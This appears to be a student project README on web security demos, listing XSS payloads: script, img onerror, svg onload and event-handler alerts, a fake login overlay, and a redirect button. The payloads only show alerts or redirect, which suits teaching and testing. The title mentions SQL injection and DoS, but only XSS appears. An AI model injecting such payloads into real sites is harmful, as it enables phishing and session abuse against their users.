# PBL_Sem3
Cyber security : demo and prevention of sql injection and Dos

# XSS scripts
"<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999">
  <div style="background:white;padding:20px;width:300px;margin:100px auto">
    <h3>Demo: Fake Login Prompt</h3>
    <button onclick="alert('This would send credentials in a real attack')">
      Click to "Login"
    </button>
  </div>
</div>"


<script>alert('XSS Demo')</script>
<img src="x" onerror="alert('Image XSS')">
<div onmouseover="alert('Event Handler XSS')">Hover me</div>
<svg/onload=alert('SVG XSS')>


<button onclick="window.location.replace('https://google.com')">
  Click to be redirected (Demo)
</button>


